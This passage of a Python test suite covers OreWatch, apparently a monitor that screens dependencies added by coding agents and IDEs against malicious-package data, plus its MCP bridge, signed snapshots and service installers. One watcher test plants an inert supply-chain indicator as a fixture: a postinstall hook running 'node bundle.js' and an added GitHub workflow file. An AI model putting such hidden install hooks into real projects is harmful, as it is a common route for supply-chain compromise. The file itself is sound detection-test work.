                    captured["payload"] = payload

                handler._write_json = fake_write_json
                handler.do_GET()
                self.assertEqual(captured["status_code"], 200)
                return captured["payload"]

            findings = call_get(
                "/v1/findings/active?"
                + urllib.parse.urlencode(
                    {
                        "project_path": project_dir,
                        "min_severity": "high",
                        "limit": 10,
                    }
                )
            )
            notifications = call_get(
                "/v1/notifications?"
                + urllib.parse.urlencode({"project_path": project_dir, "limit": 10})
            )
            health = call_get("/v1/health")

            self.assertEqual(findings["count"], 1)
            self.assertEqual(findings["findings"][0]["package_name"], "badpkg")
            self.assertEqual(findings["highest_severity"], "critical")
            self.assertEqual(notifications["count"], 1)
            self.assertIn("badpkg@1.0.0", notifications["notifications"][0]["message"])
            self.assertEqual(health["active_findings"], 1)
            self.assertEqual(health["highest_active_severity"], "critical")
            self.assertEqual(len(health["recent_notifications"]), 1)

    def test_dependency_add_accepts_version_alias_and_rejects_ambiguous_or_unknown_fields(self):
        with tempfile.TemporaryDirectory() as repo_root:
            service = MonitorService(repo_root)
            statuses = _build_database_statuses()

            with patch("monitor.service.get_database_statuses", return_value=statuses):
                with patch.object(service.package_checker, "check_packages", return_value=[]):
                    response = service.handle_dependency_add_check(
                        {
                            "client_type": "codex",
                            "project_path": repo_root,
                            "ecosystem": "npm",
                            "package_manager": "npm",
                            "operation": "add",
                            "dependencies": [{"name": "chalk", "version": "5.4.1"}],
                            "source": {"kind": "agent_command", "command": "npm install chalk@5.4.1"},
                        }
                    )

            self.assertEqual(response["decision"], "allow")
            stored = service.state.get_dependency_check(response["check_id"])
            self.assertEqual(stored["dependencies"][0]["requested_spec"], "5.4.1")
            self.assertEqual(stored["dependencies"][0]["resolved_version"], "5.4.1")

            with self.assertRaisesRegex(ValueError, "ambiguous"):
                service.handle_dependency_add_check(
                    {
                        "client_type": "codex",
                        "project_path": repo_root,
                        "ecosystem": "npm",
                        "package_manager": "npm",
                        "operation": "add",
                        "dependencies": [{"name": "chalk", "version": "5.4.1", "requested_spec": "5.4.1"}],
                        "source": {"kind": "agent_command", "command": "npm install chalk@5.4.1"},
                    }
                )

            with self.assertRaisesRegex(ValueError, "Unsupported dependency field"):
                service.handle_dependency_add_check(
                    {
                        "client_type": "codex",
                        "project_path": repo_root,
                        "ecosystem": "npm",
                        "package_manager": "npm",
                        "operation": "add",
                        "dependencies": [{"name": "chalk", "unexpected": True}],
                        "source": {"kind": "agent_command", "command": "npm install chalk"},
                    }
                )

    def test_dependency_add_validates_source_kind_and_fields(self):
        with tempfile.TemporaryDirectory() as repo_root:
            service = MonitorService(repo_root)

            with self.assertRaisesRegex(ValueError, "expected one of: agent_command, ide_action"):
                service.handle_dependency_add_check(
                    {
                        "client_type": "codex",
                        "project_path": repo_root,
                        "ecosystem": "npm",
                        "package_manager": "npm",
                        "operation": "add",
                        "dependencies": [{"name": "chalk", "version": "5.4.1"}],
                        "source": {"kind": "claude_code", "command": "npm install chalk@5.4.1"},
                    }
                )

            with self.assertRaisesRegex(ValueError, "source.command is required"):
                service.handle_dependency_add_check(
                    {
                        "client_type": "codex",
                        "project_path": repo_root,
                        "ecosystem": "npm",
                        "package_manager": "npm",
                        "operation": "add",
                        "dependencies": [{"name": "chalk", "version": "5.4.1"}],
                        "source": {"kind": "agent_command"},
                    }
                )

            with self.assertRaisesRegex(ValueError, "Unsupported source field"):
                service.handle_dependency_add_check(
                    {
                        "client_type": "codex",
                        "project_path": repo_root,
                        "ecosystem": "npm",
                        "package_manager": "npm",
                        "operation": "add",
                        "dependencies": [{"name": "chalk", "version": "5.4.1"}],
                        "source": {
                            "kind": "agent_command",
                            "command": "npm install chalk@5.4.1",
                            "extra": "value",
                        },
                    }
                )

    def test_manifest_check_parses_manifest_when_dependencies_are_omitted(self):
        with tempfile.TemporaryDirectory() as repo_root:
            service = MonitorService(repo_root)
            manifest_path = os.path.join(repo_root, "requirements.txt")
            with open(manifest_path, "w", encoding="utf-8") as handle:
                handle.write("badpkg==1.2.3\n")

            with patch("monitor.service.get_database_statuses", return_value=_build_database_statuses()):
                with patch.object(
                    service.package_checker,
                    "check_packages",
                    return_value=[{"name": "badpkg", "severity": "critical", "sources": ["osv"]}],
                ):
                    response = service.handle_manifest_check(
                        {
                            "client_type": "vscode",
                            "project_path": repo_root,
                            "ecosystem": "pypi",
                            "manifest_path": manifest_path,
                        }
                    )

            self.assertEqual(response["decision"], "override_required")
            self.assertEqual(response["manifest_status"], "blocked")
            self.assertEqual(response["results"][0]["name"], "badpkg")
            self.assertEqual(response["results"][0]["requested_spec"], "1.2.3")
            stored = service.state.get_dependency_check(response["check_id"])
            self.assertEqual(stored["dependencies"][0]["resolved_version"], "1.2.3")

    def test_manifest_check_rejects_unsupported_filename_when_auto_parsing(self):
        with tempfile.TemporaryDirectory() as repo_root:
            service = MonitorService(repo_root)
            manifest_path = os.path.join(repo_root, "deps.txt")
            with open(manifest_path, "w", encoding="utf-8") as handle:
                handle.write("requests==2.32.3\n")

            with self.assertRaisesRegex(ValueError, "Unsupported manifest filename 'deps.txt'"):
                service.handle_manifest_check(
                    {
                        "client_type": "vscode",
                        "project_path": repo_root,
                        "ecosystem": "pypi",
                        "manifest_path": manifest_path,
                    }
                )

    def test_rubygems_lookup_treats_dash_and_underscore_as_equivalent(self):
        with tempfile.TemporaryDirectory() as repo_root:
            service = MonitorService(repo_root)
            final_data_dir = service.paths["final_data_dir"]
            os.makedirs(final_data_dir, exist_ok=True)
            db_path = os.path.join(final_data_dir, "unified_rubygems.db")
            conn, temp_db_path = collector_db.create_database(db_path)
            package = {
                "name": "atlas-client",
                "versions": ["1.0.0"],
                "sources": ["openssf"],
                "severity": "critical",
                "description": "RubyGems canonicalization regression fixture",
                "detected_behaviors": ["integration_test"],
            }
            collector_db.insert_packages(conn, [package])
            collector_db.insert_metadata(
                conn,
                ecosystem="rubygems",
                packages=[package],
                timestamp="2026-04-03T00:00:00Z",
                extra_metadata={
                    "data_status": "complete",
                    "sources_used": ["openssf"],
                    "experimental_sources_used": [],
                    "last_successful_collect": "2026-04-03T00:00:00Z",
                },
            )
            collector_db.finalize_database(conn, temp_db_path, db_path)

            with patch("monitor.service.get_database_statuses", return_value=_build_database_statuses()):
                response = service.handle_dependency_add_check(
                    {
                        "client_type": "codex",
                        "project_path": repo_root,
                        "ecosystem": "rubygems",
                        "package_manager": "bundler",
                        "operation": "add",
                        "dependencies": [{"name": "atlas_client", "version": "1.0.0"}],
                        "source": {"kind": "agent_command", "command": "bundle add atlas_client --version 1.0.0"},
                    }
                )

            self.assertEqual(response["decision"], "override_required")
            self.assertEqual(response["results"][0]["status"], "malicious_match")
            self.assertEqual(response["results"][0]["name"], "atlas_client")

    def test_mcp_tool_schema_advertises_dependency_and_source_shapes(self):
        tools = {tool["name"]: tool for tool in monitor_mcp_adapter.TOOLS}

        dependency_add_schema = tools["orewatch_check_dependency_add"]["inputSchema"]
        dependency_item_schema = dependency_add_schema["properties"]["dependencies"]["items"]
        source_schema = dependency_add_schema["properties"]["source"]
        manifest_schema = tools["orewatch_check_manifest"]["inputSchema"]
        findings_schema = tools["orewatch_list_active_findings"]["inputSchema"]
        notifications_schema = tools["orewatch_list_notifications"]["inputSchema"]

        self.assertEqual(dependency_item_schema["required"], ["name"])
        self.assertIn("version", dependency_item_schema["properties"])
        self.assertFalse(dependency_item_schema["additionalProperties"])
        self.assertEqual(source_schema["properties"]["kind"]["enum"], ["agent_command", "ide_action"])
        self.assertFalse(source_schema["additionalProperties"])
        self.assertNotIn("dependencies", manifest_schema["required"])
        self.assertEqual(
            findings_schema["properties"]["min_severity"]["enum"],
            ["low", "medium", "high", "critical"],
        )
        self.assertIn("limit", notifications_schema["properties"])

    def test_mcp_bridge_maps_tools_to_local_api(self):
        with tempfile.TemporaryDirectory() as repo_root:
            service = MonitorService(repo_root)
            bridge = MCPBridge(service)
            service.config["notifications"]["desktop"] = False
            service.config["notifications"]["terminal"] = False
            project_dir = os.path.join(repo_root, "project")
            os.makedirs(project_dir, exist_ok=True)
            changes = service.state.upsert_findings(
                project_dir,
                [
                    {
                        "fingerprint": "finding-1",
                        "finding_type": "malicious_package",
                        "severity": "critical",
                        "title": "Malicious package badpkg@1.0.0",
                        "payload": {"name": "badpkg", "version": "1.0.0", "ecosystem": "npm"},
                    }
                ],
                os.path.join(repo_root, "report.json"),
            )
            service.notifier.notify_project_changes(
                project_dir,
                changes,
                {"notify_on": ["malicious_package"]},
                report_path=os.path.join(repo_root, "report.json"),
            )

            def fake_api_request(base_url, token, method, path, payload=None, timeout_ms=5000):
                del base_url, token, timeout_ms
                if method == "GET" and path == "/v1/health":
                    payload = service.build_health_payload()
                    payload["daemon_running"] = True
                    payload["api_listening"] = True
                    return payload
                if method == "GET" and path.startswith("/v1/findings/active"):
                    return service.list_active_findings(project_path=project_dir, limit=20)
                if method == "GET" and path.startswith("/v1/notifications"):
                    return service.list_recent_notifications(project_path=project_dir, limit=20)
                if method == "POST" and path == "/v1/check/dependency-add":
                    with patch(
                        "monitor.service.get_database_statuses",
                        return_value={
                            "npm": {
                                "usable": True,
                                "data_status": "complete",
                                "sources_used": ["openssf", "osv"],
                                "experimental_sources_used": [],
                            }
                        },
                    ):
                        with patch.object(service.package_checker, "check_packages", return_value=[]):
                            return service.handle_dependency_add_check(payload)
                raise AssertionError(f"Unexpected API call: {method} {path}")

            with patch("monitor.mcp_adapter.wait_for_api", return_value=True):
                with patch("monitor.mcp_adapter.monitor_api_request", side_effect=fake_api_request):
                    health = bridge.call_tool("orewatch_health", {})
                    check = bridge.call_tool(
                        "orewatch_check_dependency_add",
                        {
                            "client_type": "claude_code",
                            "project_path": repo_root,
                            "ecosystem": "npm",
                            "package_manager": "npm",
                            "operation": "add",
                            "dependencies": [
                                {
                                    "name": "chalk",
                                    "requested_spec": "5.4.1",
                                    "resolved_version": "5.4.1",
                                    "dev_dependency": False,
                                }
                            ],
                            "source": {"kind": "agent_command", "command": "npm install chalk@5.4.1"},
                        },
                    )
                    findings = bridge.call_tool(
                        "orewatch_list_active_findings",
                        {"project_path": project_dir, "min_severity": "high"},
                    )
                    notifications = bridge.call_tool(
                        "orewatch_list_notifications",
                        {"project_path": project_dir},
                    )

            self.assertTrue(health["daemon_running"])
            self.assertEqual(check["decision"], "allow")
            self.assertEqual(findings["count"], 1)
            self.assertEqual(findings["findings"][0]["package_name"], "badpkg")
            self.assertEqual(notifications["count"], 1)
            self.assertIn("badpkg@1.0.0", notifications["notifications"][0]["message"])

    def test_mcp_bridge_ensure_api_ready_starts_monitor_when_needed(self):
        with tempfile.TemporaryDirectory() as repo_root:
            service = MonitorService(repo_root)
            bridge = MCPBridge(service)

            with patch("monitor.mcp_adapter.wait_for_api", side_effect=[False, True]):
                with patch.object(
                    service,
                    "start",
                    return_value={"success": True, "message": "Monitor started", "pid": 12345},
                ) as mocked_start:
                    status = bridge.ensure_api_ready()

            self.assertTrue(status["ready"])
            self.assertTrue(status["started_monitor"])
            self.assertIn("Monitor started", status["message"])
            mocked_start.assert_called_once_with()

    def test_run_mcp_adapter_suppresses_startup_status_for_noninteractive_hosts(self):
        with tempfile.TemporaryDirectory() as repo_root:
            service = MonitorService(repo_root)
            stderr = io.StringIO()

            with patch("monitor.mcp_adapter._read_message", return_value=None):
                with patch.object(MCPBridge, "ensure_api_ready") as mocked_ready:
                    with contextlib.redirect_stderr(stderr):
                        result = run_mcp_adapter(service)

            self.assertEqual(result, 0)
            self.assertEqual(stderr.getvalue(), "")
            mocked_ready.assert_not_called()

    def test_run_mcp_adapter_responds_to_initialize_without_startup_preflight(self):
        with tempfile.TemporaryDirectory() as repo_root:
            service = MonitorService(repo_root)
            initialize = {
                "jsonrpc": "2.0",
                "id": 0,
                "method": "initialize",
                "params": {
                    "protocolVersion": "2025-11-25",
                    "capabilities": {"roots": {}, "elicitation": {"form": {}, "url": {}}},
                    "clientInfo": {"name": "claude-code", "version": "2.1.87"},
                },
            }

            with patch("monitor.mcp_adapter._read_message", side_effect=[initialize, None]):
                with patch("monitor.mcp_adapter._write_message") as mocked_write:
                    with patch.object(MCPBridge, "ensure_api_ready") as mocked_ready:
                        result = run_mcp_adapter(service)

            self.assertEqual(result, 0)
            mocked_ready.assert_not_called()
            mocked_write.assert_called_once()
            response = mocked_write.call_args.args[0]
            self.assertEqual(response["id"], 0)
            self.assertEqual(response["result"]["protocolVersion"], "2024-11-05")

    def test_read_message_accepts_bare_json_line(self):
        payload = {"jsonrpc": "2.0", "id": 0, "method": "initialize"}
        stdin = io.TextIOWrapper(
            io.BytesIO((json.dumps(payload) + "\n").encode("utf-8")),
            encoding="utf-8",
        )

        with patch.object(sys, "stdin", stdin):
            message = _read_message()

        self.assertEqual(message, payload)
        self.assertEqual(
            monitor_mcp_adapter._STDIO_MESSAGE_MODE,
            monitor_mcp_adapter.STDIO_MODE_NEWLINE,
        )

    def test_write_message_uses_newline_framing_for_bare_json_clients(self):
        payload = {"jsonrpc": "2.0", "id": 0, "result": {"ok": True}}
        stdout_buffer = io.BytesIO()
        stdout = io.TextIOWrapper(stdout_buffer, encoding="utf-8", write_through=True)

        with patch.object(sys, "stdout", stdout):
            with patch("monitor.mcp_adapter._STDIO_MESSAGE_MODE", monitor_mcp_adapter.STDIO_MODE_NEWLINE):
                _write_message(payload)

        self.assertEqual(
            stdout_buffer.getvalue().decode("utf-8"),
            json.dumps(payload) + "\n",
        )

    def test_run_mcp_adapter_can_report_startup_status_when_forced(self):
        with tempfile.TemporaryDirectory() as repo_root:
            service = MonitorService(repo_root)
            stderr = io.StringIO()

            with patch("monitor.mcp_adapter._read_message", return_value=None):
                with patch.object(
                    MCPBridge,
                    "ensure_api_ready",
                    return_value={
                        "ready": True,
                        "started_monitor": True,
                        "message": "Monitor started (API: http://127.0.0.1:48736)",
                    },
                ):
                    with patch.dict(os.environ, {"OREWATCH_MCP_VERBOSE_STARTUP": "1"}, clear=False):
                        with contextlib.redirect_stderr(stderr):
                            result = run_mcp_adapter(service)

            self.assertEqual(result, 0)
            output = stderr.getvalue()
            self.assertIn("Monitor started", output)
            self.assertIn("OreWatch MCP bridge ready on stdio", output)

    def test_build_and_apply_snapshot_with_signature(self):
        with tempfile.TemporaryDirectory() as repo_root:
            keys = self._generate_keys(repo_root)
            source_final_data_dir = os.path.join(repo_root, "snapshot-source")
            os.makedirs(source_final_data_dir, exist_ok=True)
            source_db_path = os.path.join(source_final_data_dir, "unified_npm.db")
            expected_bytes = self._write_snapshot_fixture_db(source_db_path, "original-db")

            snapshot_dir = os.path.join(repo_root, "snapshot-output")
            manifest_path = build_snapshot(
                source_final_data_dir,
                snapshot_dir,
                private_key_path=keys["private_key_path"],
                public_key_path=keys["public_key_path"],
            )

            service = MonitorService(repo_root)
            db_path = os.path.join(service.updater.final_data_dir, "unified_npm.db")
            os.makedirs(service.updater.final_data_dir, exist_ok=True)
            with open(db_path, "wb") as handle:
                handle.write(b"mutated-db")
            result = service.updater.apply_snapshot(
                manifest_path,
                public_key_path=keys["public_key_path"],
            )

            self.assertTrue(result["success"])
            with open(db_path, "rb") as handle:
                self.assertEqual(handle.read(), expected_bytes)
            self.assertEqual(result["key_id"], keys["key_id"])

    def test_publish_snapshot_creates_channel_descriptor_and_apply_from_channel(self):
        with tempfile.TemporaryDirectory() as repo_root:
            keys = self._generate_keys(repo_root)
            source_final_data_dir = os.path.join(repo_root, "publish-source")
            os.makedirs(source_final_data_dir, exist_ok=True)
            source_db_path = os.path.join(source_final_data_dir, "unified_npm.db")
            expected_bytes = self._write_snapshot_fixture_db(source_db_path, "channel-original")

            publish_dir = os.path.join(repo_root, "published")
            publish_result = publish_snapshot(
                source_final_data_dir,
                publish_dir,
                base_url=pathlib.Path(publish_dir).as_uri(),
                channel="stable",
                private_key_path=keys["private_key_path"],
                public_key_path=keys["public_key_path"],
            )

            service = MonitorService(repo_root)
            db_path = os.path.join(service.updater.final_data_dir, "unified_npm.db")
            os.makedirs(service.updater.final_data_dir, exist_ok=True)
            with open(db_path, "wb") as handle:
                handle.write(b"channel-mutated")
            result = service.updater.apply_snapshot(
                publish_result["channel_path"],
                public_key_path=keys["public_key_path"],
            )

            self.assertTrue(result["success"])
            self.assertEqual(result["channel"], "stable")
            self.assertEqual(result["key_id"], keys["key_id"])
            with open(db_path, "rb") as handle:
                self.assertEqual(handle.read(), expected_bytes)

    def test_apply_snapshot_rolls_back_when_directory_swap_fails(self):
        with tempfile.TemporaryDirectory() as repo_root:
            keys = self._generate_keys(repo_root)
            source_final_data_dir = os.path.join(repo_root, "rollback-source")
            os.makedirs(source_final_data_dir, exist_ok=True)
            source_db_path = os.path.join(source_final_data_dir, "unified_npm.db")
            self._write_snapshot_fixture_db(source_db_path, "rollback-original")

            publish_dir = os.path.join(repo_root, "published")
            publish_result = publish_snapshot(
                source_final_data_dir,
                publish_dir,
                base_url=pathlib.Path(publish_dir).as_uri(),
                channel="stable",
                private_key_path=keys["private_key_path"],
                public_key_path=keys["public_key_path"],
            )

            service = MonitorService(repo_root)
            db_path = os.path.join(service.updater.final_data_dir, "unified_npm.db")
            os.makedirs(service.updater.final_data_dir, exist_ok=True)
            with open(db_path, "wb") as handle:
                handle.write(b"rollback-mutated")
            real_replace = os.replace
            failed_once = {"value": False}

            def flaky_replace(src, dst):
                if (
                    dst == service.updater.final_data_dir
                    and src != service.updater.final_data_dir
                    and not failed_once["value"]
                ):
                    failed_once["value"] = True
                    raise OSError("swap failed")
                return real_replace(src, dst)

            with patch("monitor.snapshot_updater.os.replace", side_effect=flaky_replace):
                result = service.updater.apply_snapshot(
                    publish_result["channel_path"],
                    public_key_path=keys["public_key_path"],
                )

            self.assertFalse(result["success"])
            with open(db_path, "rb") as handle:
                self.assertEqual(handle.read(), b"rollback-mutated")

    def test_apply_snapshot_rejects_wrong_public_key(self):
        with tempfile.TemporaryDirectory() as repo_root:
            signing_keys = self._generate_keys(os.path.join(repo_root, "signing"))
            wrong_keys = self._generate_keys(os.path.join(repo_root, "wrong"))
            source_final_data_dir = os.path.join(repo_root, "wrong-key-source")
            os.makedirs(source_final_data_dir, exist_ok=True)
            source_db_path = os.path.join(source_final_data_dir, "unified_npm.db")
            self._write_snapshot_fixture_db(source_db_path, "signed-db")

            snapshot_dir = os.path.join(repo_root, "snapshot-output")
            manifest_path = build_snapshot(
                source_final_data_dir,
                snapshot_dir,
                private_key_path=signing_keys["private_key_path"],
                public_key_path=signing_keys["public_key_path"],
            )

            service = MonitorService(repo_root)
            result = service.updater.apply_snapshot(
                manifest_path,
                public_key_path=wrong_keys["public_key_path"],
            )

            self.assertFalse(result["success"])
            self.assertIn("key ID", result["message"])

    def test_watcher_detects_manifest_and_workflow_changes(self):
        with tempfile.TemporaryDirectory() as project_dir:
            package_json = os.path.join(project_dir, "package.json")
            workflows_dir = os.path.join(project_dir, ".github", "workflows")
            os.makedirs(workflows_dir, exist_ok=True)

            with open(package_json, "w", encoding="utf-8") as handle:
                handle.write('{"name": "demo"}\n')

            previous = take_project_snapshot(project_dir)

            with open(package_json, "w", encoding="utf-8") as handle:
                handle.write('{"name": "demo", "scripts": {"postinstall": "node bundle.js"}}\n')

            workflow_path = os.path.join(workflows_dir, "formatter_1.yml")
            with open(workflow_path, "w", encoding="utf-8") as handle:
                handle.write("name: formatter\n")

            current = take_project_snapshot(project_dir)
            changes = detect_changes(previous, current)

            categories = {change["category"] for change in changes}
            self.assertIn("manifest_with_ioc_risk", categories)
            self.assertIn("workflow", categories)

    def test_run_iteration_scans_changed_project_and_records_findings(self):
        with tempfile.TemporaryDirectory() as repo_root:
            project_dir = os.path.join(repo_root, "project")
            os.makedirs(project_dir, exist_ok=True)
            package_json = os.path.join(project_dir, "package.json")
            with open(package_json, "w", encoding="utf-8") as handle:
                handle.write('{"name": "demo"}\n')

            service = MonitorService(repo_root)
            service.install(service_manager="background", auto_start=False)
            service.config["service"]["debounce_seconds"] = 0
            service.config["notifications"]["auto_launch_menubar"] = False
            service.config["notifications"]["desktop"] = False
            service.config["notifications"]["terminal"] = False
            service.state.add_watched_project(project_dir, {})

            empty_result = ScanResult(
                ecosystem="npm",
                scanned_path=project_dir,
                requested_ecosystems=["npm"],
                packages=[],
                malicious_packages=[],
                iocs=[],
                report_path=None,
                data_metadata=_build_data_metadata(),
                exit_code=0,
                message="No packages found to scan",
            )
            fake_result = ScanResult(
                ecosystem="npm",
                scanned_path=project_dir,
                requested_ecosystems=["npm"],
                packages=[],
                malicious_packages=[
                    {
                        "name": "badpkg",
                        "version": "1.0.0",
                        "ecosystem": "npm",
                        "severity": "critical",
                        "sources": ["openssf"],
                    }
                ],
                iocs=[],
                report_path=os.path.join(repo_root, "report.json"),
                data_metadata=_build_data_metadata(),
                exit_code=1,
                message="1 malicious package(s) detected",
            )

            with patch.object(service.updater, "refresh_if_due", return_value={"success": True}):
                with patch("monitor.service.run_scan", side_effect=[empty_result, fake_result]) as mocked_scan:
                    with self.assertLogs("monitor.service", level="INFO"):
                        with contextlib.redirect_stdout(io.StringIO()), contextlib.redirect_stderr(io.StringIO()):
                            service.run_iteration()

                        service.state.update_project_scan(project_dir, "full", None, 0, "primed")

                        with open(package_json, "w", encoding="utf-8") as handle:
                            handle.write('{"name": "demo", "dependencies": {"badpkg": "1.0.0"}}\n')

                        service.run_iteration()

            self.assertEqual(mocked_scan.call_count, 2)
            active_findings = service.state.list_active_findings(project_dir)
            self.assertEqual(len(active_findings), 1)
            self.assertEqual(active_findings[0]["title"], "Malicious package badpkg@1.0.0")
            notifications = service.state.list_recent_notifications(limit=5)
            self.assertEqual(len(notifications), 1)
            self.assertIn("badpkg@1.0.0", notifications[0]["message"])
            self.assertIn("report.json", notifications[0]["message"])

    def test_refresh_failure_does_not_advance_last_successful_refresh_time(self):
        with tempfile.TemporaryDirectory() as repo_root:
            service = MonitorService(repo_root)
            previous_success = "2026-03-31T00:00:00Z"
            service.state.set_agent_state("last_threat_refresh_at", previous_success)

            with patch(
                "monitor.snapshot_updater.ensure_threat_data",
                return_value={
                    "success": False,
                    "message": "candidate rejected",
                    "used_live_collection": True,
                    "promotion_decision": "rejected",
                    "kept_last_known_good": False,
                    "anomalies": [
                        {"severity": "block", "message": "core source failed"},
                    ],
                },
            ):
                result = service.updater.refresh_if_due(force=True)

            self.assertFalse(result["success"])
            self.assertEqual(
                service.state.get_agent_state("last_threat_refresh_at"),
                previous_success,
            )
            self.assertEqual(
                service.state.get_agent_state("last_threat_refresh_status"),
                "failed",
            )
            self.assertTrue(
                service.state.get_agent_state("last_threat_refresh_attempt_at")
            )
            self.assertEqual(
                service.state.get_agent_state("last_live_promotion_decision"),
                "rejected",
            )

    def test_refresh_records_successful_rejected_live_update_with_last_known_good(self):
        with tempfile.TemporaryDirectory() as repo_root:
            service = MonitorService(repo_root)

            with patch(
                "monitor.snapshot_updater.ensure_threat_data",
                return_value={
                    "success": True,
                    "message": "Live threat-data candidate rejected by anomaly gates; kept last-known-good data",
                    "used_live_collection": True,
                    "promotion_decision": "rejected",
                    "kept_last_known_good": True,
                    "live_dataset_version": "20260402010101-attempt",
                    "anomalies": [
                        {"severity": "block", "message": "ecosystem removed too many packages"},
                    ],
                },
            ):
                result = service.updater.refresh_if_due(force=True)

            self.assertTrue(result["success"])
            self.assertEqual(
                service.state.get_agent_state("last_live_promotion_decision"),
                "rejected",
            )
            self.assertEqual(
                service.state.get_agent_state("current_live_dataset_version"),
                "20260402010101-attempt",
            )
            self.assertTrue(service.state.get_agent_state("last_live_promotion_at"))

    def test_run_iteration_skips_scans_when_refresh_fails(self):
        with tempfile.TemporaryDirectory() as repo_root:
            project_dir = os.path.join(repo_root, "project")
            os.makedirs(project_dir, exist_ok=True)

            service = MonitorService(repo_root)
            service.config["notifications"]["auto_launch_menubar"] = False
            service.state.add_watched_project(project_dir, {})

            with patch.object(
                service.updater,
                "refresh_if_due",
                return_value={"success": False, "message": "refresh failed"},
            ):
                with patch.object(service, "_poll_project") as mocked_poll:
                    with patch.object(service, "_run_project_scan") as mocked_scan:
                        with self.assertLogs("monitor.service", level="ERROR") as captured:
                            service.run_iteration()

            mocked_poll.assert_not_called()
            mocked_scan.assert_not_called()
            self.assertEqual(
                service.state.get_agent_state("scan_blocked_reason"),
                "refresh failed",
            )
            self.assertIn("Threat data refresh failed; skipping scans", "\n".join(captured.output))

    def test_install_and_uninstall_launchd_service_in_user_scope(self):
        with tempfile.TemporaryDirectory() as repo_root, tempfile.TemporaryDirectory() as fake_home:
            service = MonitorService(repo_root)
            with patch.dict(os.environ, {"HOME": fake_home}, clear=False):
                result = service.install(service_manager="launchd", auto_start=False)
                target_path = service._service_target_path("launchd")
                self.assertTrue(result["success"])
                self.assertTrue(os.path.exists(target_path))

                with patch.object(
                    service,
                    "_run_command",
                    return_value=subprocess.CompletedProcess(
                        args=["launchctl"],
                        returncode=1,
                        stdout="",
                        stderr="No such process",
                    ),
                ):
                    uninstall = service.uninstall(service_manager="launchd")

                self.assertTrue(uninstall["success"])
                self.assertFalse(os.path.exists(target_path))

    def test_install_launchd_removes_legacy_launch_agents(self):
        with tempfile.TemporaryDirectory() as repo_root, tempfile.TemporaryDirectory() as fake_home:
            safe_home = os.path.realpath(fake_home)
            launch_agents_dir = os.path.join(safe_home, "Library", "LaunchAgents")
            os.makedirs(launch_agents_dir, exist_ok=True)
            legacy_paths = [
                os.path.join(launch_agents_dir, "org.orewatch.monitor.56a6723458.plist"),
                os.path.join(launch_agents_dir, "org.orewatch.monitor.6cbc0aa457.plist"),
            ]
            for path in legacy_paths:
                with open(path, "w", encoding="utf-8") as handle:
                    handle.write("<plist></plist>")

            service = MonitorService(repo_root)

            def fake_run(command):
                if command[:2] == ["launchctl", "print"]:
                    return subprocess.CompletedProcess(
                        args=command,
                        returncode=0,
                        stdout="state = running\nactive count = 1\nlast exit code = 0\n",
                        stderr="",
                    )
                if command[:2] == ["launchctl", "bootout"]:
                    return subprocess.CompletedProcess(
                        args=command,
                        returncode=0,
                        stdout="",
                        stderr="",
                    )
                return subprocess.CompletedProcess(
                    args=command,
                    returncode=0,
                    stdout="",
                    stderr="",
                )

            with patch("monitor.service.sys.platform", "darwin"):
                with patch.dict(os.environ, {"HOME": safe_home}, clear=False):
                    with patch.object(service, "_run_command", side_effect=fake_run):
                        result = service.install(service_manager="launchd", auto_start=False)
                        target_path = service._service_target_path("launchd")
                        self.assertTrue(result["success"])
                        self.assertEqual(len(result["legacy_services_removed"]), 2)
                        self.assertEqual(result["legacy_services_failed"], [])
                        self.assertTrue(os.path.exists(target_path))
                        for path in legacy_paths:
                            self.assertFalse(os.path.exists(path))

    def test_status_reports_legacy_launchd_agents_and_spawn_scheduled_as_not_running(self):
        with tempfile.TemporaryDirectory() as repo_root, tempfile.TemporaryDirectory() as fake_home:
            safe_home = os.path.realpath(fake_home)
            launch_agents_dir = os.path.join(safe_home, "Library", "LaunchAgents")
            os.makedirs(launch_agents_dir, exist_ok=True)
            singleton_plist = os.path.join(launch_agents_dir, "org.orewatch.monitor.plist")
            legacy_plist = os.path.join(launch_agents_dir, "org.orewatch.monitor.56a6723458.plist")
            for path in (singleton_plist, legacy_plist):
                with open(path, "w", encoding="utf-8") as handle:
                    handle.write("<plist></plist>")

            service = MonitorService(repo_root)

            def fake_run(command):
                label = command[2].split("/")[-1]
                if label == "org.orewatch.monitor":
                    return subprocess.CompletedProcess(
                        args=command,
                        returncode=0,
                        stdout="state = spawn scheduled\nactive count = 0\nlast exit code = 1\n",
                        stderr="",
                    )
                if label == "org.orewatch.monitor.56a6723458":
                    return subprocess.CompletedProcess(
                        args=command,
                        returncode=0,
                        stdout="state = running\nactive count = 1\nlast exit code = 0\n",
                        stderr="",
                    )
                return subprocess.CompletedProcess(
                    args=command,
                    returncode=1,
                    stdout="",
                    stderr="Could not find service",
                )

            with patch("monitor.service.sys.platform", "darwin"):
                with patch.dict(os.environ, {"HOME": safe_home}, clear=False):
                    with patch.object(service, "_run_command", side_effect=fake_run):
                        status = service.get_status()
                        doctor = service.doctor()

        self.assertEqual(status["installed_service_manager"], "launchd")
        self.assertFalse(status["running"])
        self.assertTrue(status["launchd_service_loaded"])
        self.assertEqual(status["launchd_service_state"], "spawn scheduled")
        self.assertEqual(status["launchd_last_exit_code"], 1)
        self.assertEqual(status["legacy_service_count"], 1)
        self.assertEqual(status["legacy_running_services"], 1)
        self.assertEqual(doctor["legacy_launchd_agents"][0]["label"], "org.orewatch.monitor.56a6723458")

    def test_status_treats_launchd_pid_as_running_even_before_state_settles(self):
        with tempfile.TemporaryDirectory() as repo_root, tempfile.TemporaryDirectory() as fake_home:
            safe_home = os.path.realpath(fake_home)
            launch_agents_dir = os.path.join(safe_home, "Library", "LaunchAgents")
            os.makedirs(launch_agents_dir, exist_ok=True)
            singleton_plist = os.path.join(launch_agents_dir, "org.orewatch.monitor.plist")
            with open(singleton_plist, "w", encoding="utf-8") as handle:
                handle.write("<plist></plist>")

            service = MonitorService(repo_root)

            def fake_run(command):
                return subprocess.CompletedProcess(
                    args=command,
                    returncode=0,
                    stdout="state = active\nactive count = 1\npid = 82793\nlast exit code = 1\n",
                    stderr="",
                )

            with patch("monitor.service.sys.platform", "darwin"):
                with patch.dict(os.environ, {"HOME": safe_home}, clear=False):
                    with patch.object(service, "_run_command", side_effect=fake_run):
                        status = service.get_status()

        self.assertTrue(status["running"])
        self.assertEqual(status["pid"], 82793)
        self.assertEqual(status["launchd_pid"], 82793)

    def test_restart_uses_systemd_when_requested(self):
        with tempfile.TemporaryDirectory() as repo_root:
            service = MonitorService(repo_root)
            with patch.object(
                service,
                "_run_command",
                return_value=subprocess.CompletedProcess(
                    args=["systemctl"],
                    returncode=0,
                    stdout="",
                    stderr="",
                ),
            ) as mocked_run:
                result = service.restart(service_manager="systemd")

